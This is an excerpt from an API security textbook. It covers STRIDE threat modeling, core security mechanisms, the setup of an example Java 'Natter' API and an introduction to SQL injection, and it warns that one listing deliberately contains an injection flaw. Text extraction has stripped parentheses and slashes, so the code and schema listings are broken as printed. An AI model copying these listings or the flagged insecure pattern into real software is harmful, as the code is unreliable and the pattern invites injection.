a  perfect  world,  you  would  be  able  to  design  an  API  that achieved its security goals against any threat. But the world is not perfect, and it is rarely  possible  or  economical  to  prevent  all  attacks.  In  some  environments  some threats are just not worth worrying about. For example, an API for recording race times for a local cycling club probably doesn’t need to worry about the attentions of a nation-state intelligence agency, although it may want to prevent riders trying to “improve” their own best times or alter those of other cyclists. By considering realis- tic threats to your API you can decide where to concentrate your efforts and identify gaps in your defenses.    Elements of API security  17  DEFINITION A threat is an event or set of circumstances that defeats the secu- rity goals of your API. For example, an attacker stealing names and address details from your customer database is a threat to confidentiality.  The set of threats that you consider relevant to your API is known as your threat model, and the process of identifying them is known as threat modeling.   DEFINITION Threat modeling is the process of systematically identifying threats to a software system so that they can be recorded, tracked, and mitigated.  There is a famous quote attributed to Dwight D. Eisenhower:  Plans are worthless, but planning is everything.  It is often like that with threat modeling. It is less important exactly how you do threat modeling or where you record the results. What matters is that you do it, because the process  of  thinking  about  threats  and  weaknesses  in  your  system  will  almost  always improve the security of the API.    There are many ways to do threat modeling, but the general process is as follows: 1 Draw a system diagram showing the main logical components of your API. 2  Identify trust boundaries between parts of the system. Everything within a trust boundary is controlled and managed by the same owner, such as a private data- center or a set of processes running under a single operating system user.  3 Draw arrows to show how data flows between the various parts of the system. 4 Examine each component and data flow in the system and try to identify threats that might undermine your security goals in each case. Pay particular attention to flows that cross trust boundaries.  See the next section for how to do this.   5 Record threats to ensure they are tracked and managed.  The diagram produced in steps one to three is known as a dataflow diagram, and an example for a fictitious pizza ordering API is given in figure 1.6. The API is accessed by a web application running in a web browser, and also by a native mobile phone app, so these are both drawn as processes in their own trust boundaries. The API server runs in the same datacenter as the database, but they run as different operating system accounts  so  you  can  draw  further  trust  boundaries  to  make  this  clear.  Note  that  the operating system account boundaries are nested inside the datacenter trust boundary. For the database, I’ve drawn the database management system  DBMS  process sepa- rately from the actual data files. It’s often useful to consider threats from users that have direct access to files separately from threats that access the DBMS API because these can be quite different. IDENTIFYING THREATS If you pay attention to cybersecurity news stories, it can sometimes seem that there are a bewildering variety of attacks that you need to defend against. While this is partly true, many attacks fall into a few known categories. Several methodologies have been   18  CHAPTER 1 What is API security?

Trust boundaries are marked with dashed lines. Internal processes are  marked with rounded rectangles, while external entities use squared ends. Note that we  include both the database management system  DBMS  process and its data files as  separate entities.  developed to try to systematically identify threats to software systems, and we can use these to identify the kinds of threats that might befall your API. The goal of threat modeling is to identify these general threats, not to enumerate every possible attack. One very popular methodology is known by the acronym STRIDE, which stands for:   Spoofing—Pretending to be somebody else  Tampering—Altering data, messages, or settings you’re not supposed to alter  Repudiation—Denying that you did something that you really did do  Information disclosure—Revealing information that should be kept private  Denial of service—Preventing others from accessing information and services  Elevation of privilege—Gaining access to functionality you’re not supposed to  have access to  Each initial in the STRIDE acronym represents a class of threat to your API. General security mechanisms can effectively address each class of threat. For example, spoof- ing threats, in which somebody pretends to be somebody else, can be addressed by requiring all users to authenticate. Many common threats to API security can be elim- inated entirely  or at least significantly mitigated  by the consistent application of a few basic security mechanisms, as you’ll see in chapter 3 and the rest of this book.  LEARN ABOUT IT You can learn more about STRIDE, and how to identify spe- cific  threats  to  your  applications,  through  one  of  many  good  books  about threat modeling. I recommend Adam Shostack’s Threat Modeling: Designing for Security  Wiley, 2014  as a good introduction to the subject.   Security mechanisms  19  Pop quiz 3 What do the initials CIA stand for when talking about security goals?  4 Which one of the following data flows should you pay the most attention to when  threat modeling? a Data flows within a web browser b Data flows that cross trust boundaries c Data flows between internal processes  d Data flows between external processes e Data flows between a database and its data files  5  Imagine the following scenario: a rogue system administrator turns off audit log- ging  before performing actions using an API. Which of the  STRIDE threats  are being abused in this case? Recall from section 1.1 that an audit log records who did what on the system.  The answers are at the end of the chapter.  1.5  Security mechanisms Threats can be countered by applying security mechanisms that ensure that particular security goals are met. In this section we will run through the most common security mechanisms that you will generally find in every well-designed API:   Encryption ensures that data can’t be read by unauthorized parties, either when it is being transmitted from the API to a client or at rest in a database or filesys- tem. Modern encryption also ensures that data can’t be modified by an attacker.  Authentication is the process of ensuring that your users and clients are who they  say they are.   Access control  also known as authorization  is the process of ensuring that every  request made to your API is appropriately authorized.   Audit logging is used to ensure that all operations are recorded to allow account-  ability and proper monitoring of the API.   Rate-limiting is used to prevent any one user  or group of users  using all of the  resources and preventing access for legitimate users.  Figure 1.7 shows how these five processes are typically layered as a series of filters that a request passes through before it is processed by the core logic of your API. As dis- cussed in section 1.3.1, each of these five stages can sometimes be outsourced to an external component such as an API gateway. In this book, you will build each of them from scratch so that you can assess when an external component may be an appropri- ate choice.   20  CHAPTER 1 What is API security?  Rate-limiting rejects requests when the API is overloaded.  Encryption prevents data being stolen or modiﬁed in transit or at rest.  User  Authentication ensures users are who they say they are.  An audit log records who did what and when.

Figure 1.7 When processing a request, a secure API will apply some standard steps. Requests and  responses are encrypted using the HTTPS protocol. Rate-limiting is applied to prevent DoS attacks.  Then users and clients are identified and authenticated, and a record is made of the access attempt  in an access or audit log. Finally, checks are made to decide if this user should be able to perform this  request. The outcome of the request should also be recorded in the audit log.  1.5.1  Encryption The other security mechanisms discussed in this section deal with protecting access to data through the API itself. Encryption is used to protect data when it is outside your API. There are two main cases in which data may be at risk:   Requests and responses to an API may be at risk as they travel over networks, such as the internet. Encrypting data in transit is used to protect against these threats.   Data may be at risk from people with access to the disk storage that is used for  persistence. Encrypting data at rest is used to protect against these threats.  TLS should be used to encrypt data in transit and is covered in chapter 3. Alternatives to TLS for constrained devices are discussed in chapter 12. Encrypting data at rest is a complex topic with many aspects to consider and is largely beyond the scope of this book. Some considerations for database encryption are discussed in chapter 5.    1.5.2  Security mechanisms  21  Identification and authentication Authentication is the process of verifying whether a user is who they say they are. We are normally concerned with identifying who that user is, but in many cases the easiest way to do that is to have the client tell us who they are and check that they are telling the truth.     The  driving  test  story  at  the  beginning  of  the  chapter  illustrates  the  difference between identification and authentication. When you saw your old friend Alice in the park, you immediately knew who she was due to a shared history of previous interac- tions. It would be downright bizarre  not to mention rude  if you asked old friends for formal identification! On the other hand, when you attended your driving test it was not surprising that the examiner asked to see your driving license. The examiner has probably never met you before, and a driving test is a situation in which somebody might  reasonably  lie  about  who  they  are,  for  example,  to  get  a  more  experienced driver to take the test for them. The driving license authenticates your claim that you are a particular person, and the examiner trusts it because it is issued by an official body and is difficult to fake.   Why do we need to identify the users of an API in the first place? You should always ask  this  question  of  any  security  mechanism  you  are  adding  to  your  API,  and  the answer should be in terms of one or more of the security goals that you are trying to achieve. You may want to identify users for several reasons:   You want to record which users performed what actions to ensure accountability.  You may need to know who a user is to decide what they can do, to enforce con-   You may want to only process authenticated requests to avoid anonymous DoS  fidentiality and integrity goals.   attacks that compromise availability.   Because authentication is the most common method of identifying a user, it is com- mon  to  talk  of  “authenticating  a  user”  as  a  shorthand  for  identifying  that  user  via authentication. In reality, we never “authenticate” a user themselves but rather claims about their identity such as their username. To authenticate a claim simply means to determine if it is authentic, or genuine. This is usually achieved by asking the user to present some kind of credentials that prove that the claims are correct  they provide credence to the claims, which is where the word “credential” comes from , such as pro- viding a password along with the username that only that user would know.  AUTHENTICATION FACTORS There are many ways of authenticating a user, which can be divided into three broad categories known as authentication factors:   Something you know, such as a secret password  Something you have, like a key or physical device  Something you are. This refers to biometric factors, such as your unique finger-  print or iris pattern.   22  CHAPTER 1 What is API security?  1.5.3  Access control and authorization  Any  individual  factor  of  authentication  may  be  compromised.  People  choose  weak passwords or write them down on notes attached to their computer screen, and they mislay physical devices. Although biometric factors can be appealing, they often have high error rates. For this reason, the most secure authentication systems require two or more different factors. For example, your bank may require you to enter a pass- word and then use a device with your bank card to generate a unique login code. This is known as two-factor authentication  2FA  or multi-factor authentication  MFA .  DEFINITION Two-factor authentication  2FA  or multi-factor authentication  MFA  require  a  user  to  authenticate  with  two  or  more  different  factors  so  that  a compromise of any one factor is not enough to grant access to a system.  Note that an authentication factor is different from a credential. Authenticating with two different passwords would still be considered a single factor, because they are both based on  something you know. On the  other hand, authenticating  with a password and a time-based code generated by an app on your phone counts as 2FA because the app on your phone is something you have. Without the app  and the secret key stored inside it , you would not be able to generate the codes.  In order to preserve confidentiality and integrity of your assets, it is usually necessary to control who has access to what and what actions they are allowed to perform. For example,  a  messaging  API  may  want  to  enforce  that  users  are  only  allowed  to  read their own messages and not those of anybody else, or that they can only send messages to users in their friendship group.   In  this  book  I’ve  used  the  terms  authorization  and  access  control  inter- NOTE changeably, because this is how they are often used in practice. Some authors use the term access control to refer to an overall process including authentica- tion, authorization, and audit logging, or AAA for short.  There are two primary approaches to access control that are used for APIs:   Identity-based access control first identifies the user and then determines what they can do based on who they are. A user can try to access any resource but may be denied access based on access control rules.   Capability-based access control uses special tokens or keys known as capabilities to access an API. The capability itself says what operations the bearer can perform rather than who the user is. A capability both names a resource and describes the permissions on it, so a user is not able to access any resource that they do not have a capability for.  Chapters 8 and 9 cover these two approaches to access control in detail.      Security mechanisms  23  Capability-based security The predominant approach to access control is identity-based, where who you are determines what you can do. When you run an application on your computer, it runs with the same permissions that you have. It can read and write all the files that you can read and write and perform all the same actions that you can do. In a capability- based system, permissions are based on unforgeable references known as capa- bilities  or keys . A user or an application can only read a file if they hold a capability that allows them to read that specific file. This is a bit like a physical key that you use in the real world; whoever holds the key can open the door that it unlocks. Just like  a  real  key  typically  only  unlocks  a  single  door,  capabilities  are  typically  also restricted to just one object or file. A user may need many capabilities to get their work done, and capability systems provide mechanisms for managing all these capa- bilities in a user-friendly way. Capability-based access control is covered in detail in chapter 9.  It is even possible to design applications and their APIs to not need any access control at all. A wiki is a type of website invented by Ward Cunningham, where users collabo- rate to author articles about some topic or topics. The most famous wiki is Wikipedia, the  online  encyclopedia  that  is  one  of  the  most  viewed  sites  on  the  web.  A  wiki  is unusual in that it has no access controls at all. Any user can view and edit any page, and even create new pages. Instead of access controls, a wiki provides extensive version control capabilities so that malicious edits can be easily undone. An audit log of edits provides accountability because it is easy to see who changed what and to revert those changes if necessary. Social norms develop to discourage antisocial behavior. Even so, large wikis like Wikipedia often have some explicit access control policies so that arti- cles can be locked temporarily to prevent “edit wars” when two users disagree strongly or in cases of persistent vandalism.  1.5.4  Audit logging  An audit log is a record of every operation performed using your API. The purpose of an audit log is to ensure accountability. It can be used after a security breach as part of a forensic investigation to find out what went wrong, but also analyzed in real-time by log analysis tools to identity attacks in progress and other suspicious behavior. A good audit log can be used to answer the following kinds of questions:   Who performed the action and what client did they use?  When was the request received?  What kind of request was it, such as a read or modify operation?  What resource was being accessed?  Was the request successful? If not, why?  What other requests did they make around the same time?   24  CHAPTER 1 What is API security?  1.5.5 Rate-limiting  It’s essential that audit logs are protected from tampering, and they often contain per- sonally identifiable information that should be kept confidential. You’ll learn more about audit logging in chapter 3.  DEFINITION Personally  identifiable  information,  or  PII,  is  any  information  that relates  to  an  individual  person  and  can  help  to  identify  that  person.  For example, their name or address, or their date and place of birth. Many coun- tries have data protection laws like the GDPR, which strictly control how PII may be stored and used.  The last mechanisms we will consider are for preserving availability in the face of mali- cious or accidental DoS attacks. A DoS attack works by exhausting some finite resource that your API requires to service legitimate requests. Such resources include CPU time, memory and disk usage, power, and so on. By flooding your API with bogus requests, these resources become tied up servicing those requests and not others. As well as send- ing large numbers of requests, an attacker may also send overly large requests that con- sume a lot of memory or send requests very slowly so that resources are tied up for a long time without the malicious client needing to expend much effort.   The key to fending off these attacks is to recognize that a client  or group of cli- ents  is using more than their fair share of some resource: time, memory, number of connections, and so on. By limiting the resources that any one user is allowed to con- sume, we can reduce the risk of attack. Once a user has authenticated, your applica- tion  can  enforce  quotas  that  restrict  what  they  are  allowed  to  do.  For  example,  you might  restrict  each  user  to  a  certain  number  of  API  requests  per  hour,  preventing them from flooding the system with too many requests. There are often business rea- sons to do this for billing purposes, as well as security benefits. Due to the application- specific nature of quotas, we won’t cover them further in this book.  DEFINITION A quota is a limit on the number of resources that an individual user account can consume. For example, you may only allow a user to post five messages per day.  Before a user has logged in you can apply simpler rate-limiting to restrict the number of requests overall, or from a particular IP address or range. To apply rate-limiting, the API  or a load balancer  keeps track of how many requests per second it is serving. Once a predefined limit is reached then the system rejects new requests until the rate falls back under the limit. A rate-limiter can either completely close connections when the limit is exceeded or else slow down the processing of requests, a process known as throttling.  When  a  distributed  DoS  is  in  progress,  malicious  requests  will  be  coming from many different machines on different IP addresses. It is therefore important to be able to apply rate-limiting to a whole group of clients rather than individually. Rate- limiting attempts to ensure that large floods of requests are rejected before the system is completely overwhelmed and ceases functioning entirely.   Answers to pop quiz questions  25  DEFINITION Throttling  is  a  process  by  which  a  client’s  requests  are  slowed down without disconnecting the client completely. Throttling can be achieved either by queueing requests for later processing, or else by responding to the requests with a status code telling the client to slow down. If the client doesn’t slow down, then subsequent requests are rejected.  The most important aspect of rate-limiting is that it should use fewer resources than would be used if the request were processed normally. For this reason, rate-limiting is often performed in highly optimized code running in an off-the-shelf load balancer, reverse proxy, or API gateway that can sit in front of your API to protect it from DoS attacks rather than having to add this code to each API. Some commercial companies offer DoS protection as a service. These companies have large global infrastructure that is able to absorb the traffic from a DoS attack and quickly block abusive clients.   In the next chapter, we will get our hands dirty with a real API and apply some of  the techniques we have discussed in this chapter.

APIs often exist at trust boundaries.  5 Repudiation. By disabling audit logging, the rogue system administrator will later  be able to deny performing actions on the system as there will be no record.   26  CHAPTER 1 What is API security?  6 e. Rate-limiting primarily protects against denial of service attacks by preventing  a single attacker from overloading the API with requests.  7 A hardware security key is something you have. They are usually small devices that can be plugged into a USB port on your laptop and can be attached to your key ring.  Summary   You learned what an API is and the elements of API security, drawing on aspects  of information security, network security, and application security.   You can define security for your API in terms of assets and security goals.   The basic API security goals are confidentiality, integrity, and availability, as well  as accountability, privacy, and others.   You can identify threats and assess risk using frameworks such as STRIDE.  Security mechanisms can be used to achieve your security goals, including encryp-  tion, authentication, access control, audit logging, and rate-limiting.   Secure API development  This chapter covers  Setting up an example API project  Understanding secure development principles  Identifying common attacks against APIs  Validating input and producing safe output  I’ve so far talked about API security in the abstract, but in this chapter, you’ll dive in and look at the nuts and bolts of developing an example API. I’ve written many APIs in my career and now spend my days reviewing the security of APIs used for critical security operations in major corporations, banks, and multinational media organiza- tions. Although the technologies and techniques vary from situation to situation and from year to year, the fundamentals remain the same. In this chapter you’ll learn how to apply basic secure development principles to API development, so that you can build more advanced security measures on top of a firm foundation.  2.1  The Natter API You’ve had the perfect business idea. What the world needs is a new social network. You’ve got the name and the concept: Natter—the social network for coffee morn- ings, book groups, and other small gatherings. You’ve defined your minimum viable  27   28  CHAPTER 2 Secure API development  product, somehow received some funding, and now need to put together an API and a simple web client. You’ll soon be the new Mark Zuckerberg, rich beyond your dreams, and considering a run for president.   Just one small problem: your investors are worried about security. Now you must convince them that you’ve got this covered, and that they won’t be a laughing stock on launch night or faced with hefty legal liabilities later. Where do you start?    Although  this  scenario  might  not  be  much  like  anything  you’re  working  on,  if you’re reading this book the chances are that at some point you’ve had to think about the security of an API that you’ve designed, built, or been asked to maintain. In this chapter, you’ll build a toy API example, see examples of attacks against that API, and learn how to apply basic secure development principles to eliminate those attacks.  2.1.1 Overview of the Natter API  The Natter API is split into two REST endpoints, one for normal users and one for mod- erators  who  have  special  privileges  to  tackle  abusive  behavior.  Interactions  between users are built around a concept of social spaces, which are invite-only groups. Anyone can sign up and create a social space and then invite their friends to join. Any user in the group can post a message to the group, and it can be read by any other member of the group. The creator of a space becomes the first moderator of that space.   The overall API deployment is shown in figure 2.1. The two APIs are exposed over HTTP and use JSON for message content, for both mobile and web clients. Connec- tions to the shared database use standard SQL over Java’s JDBC API.  The Natter API handles creation of social spaces and keeping track of messages within a space.  Mobile UI  Natter API  HTTP  Web UI  Moderation API  SQL  Message database  The database stores messages and social space metadata.  Clients  The Moderation API allows privileged users  moderators  to delete offensive messages.  Figure 2.1 Natter exposes two APIs—one for normal users and one for moderators. For  simplicity, both share the same database. Mobile and web clients communicate with the  API using JSON over HTTP, although the APIs communicate with the database using SQL  over JDBC.   The Natter API  29  The Natter API offers the following operations:   A HTTP POST request to the  spaces URI creates a new social space. The user that  performs  this  POST  operation  becomes  the  owner  of  the  new  space.  A unique identifier for the space is returned in the response.   Users can add messages to a social space by sending a POST request to  spaces     messages where   is the unique identifier of the space.   The  messages  in  a  space  can  be  queried  using  a  GET  request  to   spaces    messages.  A  since=   query  parameter  can  be  used  to limit the messages returned to a recent period.   Finally, the details of individual messages can be obtained using a GET request  to  spaces   messages  .  The  moderator  API  contains  a  single  operation  to  delete  a  message  by  sending  a DELETE request to the message URI. A Postman collection to help you use the API is available  from  https:  www.getpostman.com collections ef49c7f5cba0737ecdfd.  To import the  collection  in  Postman,  go  to  File,  then  Import,  and  select  the  Link  tab. Then enter the link, and click Continue.  TIP Postman  https:  www.postman.com  is a widely used tool for exploring and documenting HTTP APIs. You can use it to test examples for the APIs developed in this book, but I also provide equivalent commands using simple tools throughout the book.  In this chapter, you  will implement just  the  operation to  create a  new  social space. Operations for posting messages to a space and reading messages are left as an exer- cise. The GitHub repository accompanying the book  https:  github.com NeilMadden  apisecurityinaction  contains sample implementations of the remaining operations in the chapter02-end branch.  2.1.2  Implementation overview  The  Natter  API  is  written  in  Java  11  using  the  Spark  Java   http:  sparkjava.com  framework  not to be confused with the  Apache Spark data analytics platform . To make the examples as clear as possible to non-Java developers, they are written in a simple style, avoiding too many Java-specific idioms. The code is also written for clarity and  simplicity  rather  than  production-readiness.  Maven  is  used  to  build  the  code examples, and an H2 in-memory database  https:  h2database.com  is used for data storage. The Dalesbred database abstraction library  https:  dalesbred.org  is used to provide a more convenient interface to the database than Java’s JDBC interface, with- out bringing in the complexity of a full object-relational mapping framework.    Detailed  instructions  on  installing  these  dependencies  for  Mac,  Windows,  and Linux are in appendix A. If you don’t have all or any of these installed, be sure you have them ready before you continue.   30  CHAPTER 2 Secure API development  TIP For the best learning experience, it is a good idea to type out the listings in this book by hand, so that you are sure you understand every line. But if you want to get going more quickly, the full source code of each chapter is available  on  GitHub  from  https:  github.com NeilMadden apisecurityin- action. Follow the instructions in the README.md file to get set up.  2.1.3  Setting up the project  Use  Maven  to  generate  the  basic  project  structure,  by  running  the  following  com- mand in the folder where you want to create the project:  mvn archetype:generate \ ➥    -DgroupId=com.manning.apisecurityinaction \ ➥    -DartifactId=natter-api \ ➥    -DarchetypeArtifactId=maven-archetype-quickstart \ ➥    -DarchetypeVersion=1.4 -DinteractiveMode=false  If this is the first time that you’ve used Maven, it may take some time as it downloads the dependencies that it needs. Once it  completes, you’ll be left with the following project  structure,  containing  the  initial  Maven  project  file   pom.xml ,  and  an  App class and AppTest unit test class under the required Java package folder structure.  The Maven  project file  natter-api ├── pom.xml        └── src     ├── main     │   └── java     │       └── com     │           └── manning     │               └── apisecurityinaction     │                   └── App.java              └── test         └── java             └── com                 └── manning                     └── apisecurityinaction                         └── AppTest.java        The sample Java class  generated by Maven  A sample unit  test file  You  first  need  to  replace  the  generated  Maven  project  file  with  one  that  lists  the dependencies that you’ll use. Locate the pom.xml file and open it in your favorite edi- tor or IDE. Select the entire contents of the file and delete it, then paste the contents of listing 2.1 into the editor and save the new file. This ensures that Maven is config- ured  for  Java  11,  sets  up  the  main  class  to  point  to  the  Main  class   to  be  written shortly , and configures all the dependencies you need.  NOTE At the time of writing, the latest version of the H2 database is 1.4.200, but this version causes some errors with the examples in this book. Please use version 1.4.197 as shown in the listing.

You can now delete the App.java and AppTest.java files, because you’ll be writing new versions of these as we go.   32  2.1.4  CHAPTER 2 Secure API development  Initializing the database To  get  the  API  up  and  running,  you’ll  need  a  database  to  store  the  messages  that users send to each other in a social space, as well as the metadata about each social space, such as who created it and what it is called. While a database is not essential for this example, most real-world APIs will use one to store data, and so we will use one here  to  demonstrate  secure  development  when  interacting  with  a  database.  The schema is very simple and shown in figure 2.2. It consists of just two entities: social spaces and messages. Spaces are stored in the spaces database table, along with the name of the space and the name of the owner who created it. Messages are stored in the messages table, with a reference to the space they are in, as well as the message content  as text , the name of the user who posted the message, and the time at which it was created.  Spaces and messages have unique ids created automatically from a database sequence.  space_id  Messages within a space are represented by the messages table.  name  Space  Message  space_id  owner  A space represents a social space in the Natter API.  A space can have many messages, but each message is in exactly one space.  Attributes of a message include the name of the author, the time and the contents.  msg_ id  author  msg_time  msg_txt  Figure 2.2 The Natter database schema consists of social spaces and messages within those  spaces. Spaces have an owner and a name, while messages have an author, the text of the message,  and the time at which the message was sent. Unique IDs for messages and spaces are generated  automatically using SQL sequences.  Using your favorite editor or IDE, create a file schema.sql under natter-api src main  resources and copy the contents of listing 2.2 into it. It includes a table named spaces for  keeping  track  of  social  spaces  and  their  owners.  A  sequence  is  used  to  allocate unique IDs for spaces. If you haven’t used a sequence before, it’s a bit like a special table that returns a new value every time you read from it.    Another table, messages, keeps track of individual messages sent to a space, along with who the author was, when it was sent, and so on. We index this table by time, so that you can quickly search for new messages that have been posted to a space since a user last logged on.   The Natter API  33  Listing 2.2 The database schema: schema.sql  We use sequences to ensure  uniqueness of primary keys.  The spaces table describes who  owns which social spaces.  CREATE TABLE spaces                  space_id INT PRIMARY KEY,     name VARCHAR 255  NOT NULL,     owner VARCHAR 30  NOT NULL  ; CREATE SEQUENCE space_id_seq;     CREATE TABLE messages                                       space_id INT NOT NULL REFERENCES spaces space_id ,     msg_id INT PRIMARY KEY,     author VARCHAR 30  NOT NULL,     msg_time TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,     msg_text VARCHAR 1024  NOT NULL  ; CREATE SEQUENCE msg_id_seq; CREATE INDEX msg_timestamp_idx ON messages msg_time ;     CREATE UNIQUE INDEX space_name_idx ON spaces name ;  The messages  table contains the  actual messages.  We index messages  by timestamp to  allow catching up on  recent messages.  Fire up your editor again and create the file Main.java under natter-api src main  java com manning apisecurityinaction   where  Maven  generated  the  App.java  for you earlier . The following listing shows the contents of this file. In the main method, you first create a new JdbcConnectionPool object. This is a H2 class that implements the standard JDBC DataSource interface, while providing simple pooling of connec- tions  internally.  You  can  then  wrap  this  in  a  Dalesbred  Database  object  using  the Database.forDataSource   method. Once you’ve created the connection pool, you can then load the database schema from the schema.sql file that you created earlier. When you build the project, Maven will copy any files in the src main resources file into the .jar file it creates. You can therefore use the Class.getResource   method to find the file from the Java classpath, as shown in listing 2.3.  Listing 2.3 Setting up the database connection pool  package com.manning.apisecurityinaction;  import java.nio.file.*;  import org.dalesbred.*; import org.h2.jdbcx.*; import org.json.*;  public class Main {    public static void main String... args  throws Exception {     var datasource = JdbcConnectionPool.create                        "jdbc:h2:mem:natter", "natter", "password" ;              var database = Database.forDataSource datasource ;     createTables database ;   }      private static void createTables Database database         throws Exception {  Create a JDBC  DataSource object  for the in-memory  database.   34  2.2  CHAPTER 2 Secure API development      var path = Paths.get                                           Main.class.getResource " schema.sql" .toURI   ;        database.update Files.readString path  ;                 } }  Load table  definitions from  schema.sql.  Developing the REST API Now that you’ve got the database in place, you can start to write the actual REST APIs that  use  it.  You’ll  flesh  out  the  implementation  details  as  we  progress  through  the chapter, learning secure development principles as you go.    Rather  than  implement  all  your  application  logic  directly  within  the  Main  class, you’ll  extract  the  core  operations  into  several  controller  objects.  The  Main  class  will then  define  mappings  between  HTTP  requests  and  methods  on  these  controller objects. In chapter 3, you will add several security mechanisms to protect your API, and these will be implemented as filters within the Main class without altering the con- troller objects. This is a common pattern when developing REST APIs and makes the code a bit easier to read as the HTTP-specific details are separated from the core logic of the API. Although you can write secure code without implementing this separation, it  is  much  easier  to  review  security  mechanisms  if  they  are  clearly  separated  rather than mixed into the core logic.  DEFINITION A controller is a piece of code in your API that responds to requests from users. The term comes from the popular model-view-controller  MVC  pattern  for  constructing  user  interfaces.  The  model  is  a  structured  view  of data relevant to a request, while the view is the user interface that displays that data to the user. The controller then processes requests made by the user and updates the model appropriately. In a typical REST API, there is no view com- ponent beyond simple JSON formatting, but it is still useful to structure your code in terms of controller objects.   The first operation you’ll implement is to allow a user to create a new social space, which they can then claim as owner. You’ll create a new SpaceController class that will handle all operations related to creating and interacting with social spaces. The controller will be initialized with the Dalesbred Database object that you created in listing 2.3. The createSpace method will be called when a user creates a new social space,  and  Spark  will  pass  in  a  Request  and  a  Response  object  that  you  can  use  to implement the operation and produce a response.    The code follows the general pattern of many API operations.   1 First, we parse the input and extract variables of interest.  2 Then we start a database transaction and perform any actions or queries requested. 3 Finally, we prepare a response, as shown in figure 2.3.   2.2.1  Creating a new space   Developing the REST API  35  Parse input  Perform operation  Prepare output  Figure 2.3 An API operation can generally be separated into three phases:  first we parse the input and extract variables of interest, then we perform  the actual operation, and finally we prepare some output that indicates the  status of the operation.  In  this  case,  you’ll  use  the  json.org  library  to  parse  the  request  body  as  JSON  and extract  the  name  and  owner  of  the  new  space.  You’ll  then  use  Dalesbred  to  start  a transaction against the database and create the new space by inserting a new row into the  spaces  database  table.  Finally,  if  all  was  successful,  you’ll  create  a  201  Created response  with  some  JSON  describing  the  newly  created  space.  As  is  required  for  a HTTP 201 response, you will set the URI of the newly created space in the Location header of the response.   Navigate to the Natter API project you created and find the src main java com  manning apisecurityinaction  folder.  Create  a  new  sub-folder  named  “controller” under this location. Then open your text editor and create a new file called Space- Controller.java in this new folder. The resulting file structure should look as follows, with the new items highlighted in bold:  natter-api ├── pom.xml └── src     ├── main     │   └── java     │       └── com     │           └── manning     │               └── apisecurityinaction     │                   ├── Main.java        │                   └── controller     │                       └── SpaceController.java     └── test         └── …  Open the SpaceController.java file in your editor again and type in the contents of list- ing 2.4 and click Save.   WARNING The code as written contains a serious security vulnerability, known as an SQL injection vulnerability. You’ll fix that in section 2.4. I’ve marked the broken line of code with a comment to make sure you don’t accidentally copy this into a real application.   36  CHAPTER 2 Secure API development  Listing 2.4 Creating a new social space  package com.manning.apisecurityinaction.controller;  import org.dalesbred.Database; import org.json.*; import spark.*;  public class SpaceController {    private final Database database;    public SpaceController Database database  {     this.database = database;   }    public JSONObject createSpace Request request, Response response        throws SQLException {     var json = new JSONObject request.body   ;          var spaceName = json.getString "name" ;     var owner = json.getString "owner" ;  Parse the request payload and  extract details from the JSON.

To do this, you’ll need to create a new Spark route that describes how to match incoming HTTP requests to methods in our controller objects.   DEFINITION A route defines how to convert a HTTP request into a method call for one of your controller objects. For example, a HTTP POST method to the  spaces URI may result in a createSpace method being called on the Space- Controller object.   Wiring up the REST endpoints  37  In listing 2.5, you’ll use static imports to access the Spark API. This is not strictly neces- sary,  but  it’s  recommended  by  the  Spark  developers  because  it  can  make  the  code more readable. Then you need to create an instance of your SpaceController object that you created in the last section, passing in the Dalesbred Database object so that it can access the database. You can then configure Spark routes to call methods on the controller  object  in  response  to  HTTP  requests.  For  example,  the  following  line  of code arranges for the createSpace method to be called when a HTTP POST request is received for the  spaces URI:  post " spaces", spaceController::createSpace ;  Finally, because all your API responses will be JSON, we add a Spark after filter to set the Content-Type header on the response to application json in all cases, which is the correct content type for JSON. As we shall see later, it is important to set correct type headers on all responses to ensure that data is processed as intended by the cli- ent. We also add some error handlers to produce correct JSON responses for internal server errors and not found errors  when a user requests a URI that does not have a defined route .  TIP Spark has three types of filters  figure 2.4 . Before-filters run before the request is handled and are useful for validation and setting defaults. After- filters  run  after  the  request  has  been  handled,  but  before  any  exception handlers   if  processing  the  request  threw  an  exception .  There  are  also afterAfter-filters,  which  run  after  all  other  processing,  including  exception handlers, and so are useful for setting headers that you want to have present on all responses.  Request  Before- ﬁlters  Exception  handler  After-ﬁlters  Request handler  Exception response  afterAfter-  ﬁlters  Normal response  Figure 2.4 Spark before-filters run before the request is processed by your  request handler. If the handler completes normally, then Spark will run any  after-filters. If the handler throws an exception, then Spark runs the matching  exception handler instead of the after-filters. Finally, afterAfter-filters are  always run after every request has been processed.   38  CHAPTER 2 Secure API development  Locate the Main.java file in the project and open it in your text editor.

What happens when you send unusual inputs, such as an owner username longer than 30 characters? What about names that con- tain special characters such as single quotes?  2.4  Injection attacks Unfortunately, the code you’ve just written has a serious security vulnerability, known as a SQL injection attack. Injection attacks are one of the most widespread and most serious vulnerabilities in any software application. Injection is currently the number one entry in the OWASP Top 10  see sidebar .  The OWASP Top 10 The OWASP Top 10 is a listing of the top 10 vulnerabilities found in many web applica- tions and is considered the authoritative baseline for a secure web application. Pro- duced by the Open Web Application Security Project  OWASP  every few years, the latest edition was published in 2017 and is available from https:  owasp.org www-project- top-ten . The Top 10 is collated from feedback from security professionals and a sur- vey of reported vulnerabilities. While this book was being written they also published a specific API security top 10  https:  owasp.org www-project-api-security  . The cur- rent versions list the following vulnerabilities, most of which are covered in this book:  Web application top 10  API security top 10  A1:2017 - Injection  API1:2019 - Broken Object Level Authorization  A2:2017 - Broken Authentication  API2:2019 - Broken User Authentication  A3:2017 - Sensitive Data Exposure  API3:2019 - Excessive Data Exposure  A4:2017 - XML External Entities  XXE   API4:2019 - Lack of Resources & Rate Limiting  A5:2017 - Broken Access Control  API5:2019 - Broken Function Level Authorization  A6:2017 - Security Misconfiguration  API6:2019 - Mass Assignment  A7:2017 - Cross-Site Scripting  XSS   API7:2019 - Security Misconfiguration   40  CHAPTER 2 Secure API development   continued   Web application top 10  API security top 10  A8:2017 - Insecure Deserialization  API8:2019 - Injection  A9:2017 - Using Components with Known  Vulnerabilities  API9:2019 - Improper Assets Management  A10:2017 - Insufficient Logging & Monitoring  API10:2019 - Insufficient Logging & Monitoring  It’s important to note that although every vulnerability in the Top 10 is worth learning about, avoiding the Top 10 will not by itself make your application secure. There is no simple checklist of vulnerabilities to avoid. Instead, this book will teach you the general principles to avoid entire classes of vulnerabilities.  An injection attack can occur anywhere that you execute dynamic code in response to user input, such as SQL and LDAP queries, and when running operating system commands.   DEFINITION An injection attack occurs when unvalidated user input is included directly in a dynamic command or query that is executed by the application, allowing an attacker to control the code that is executed.   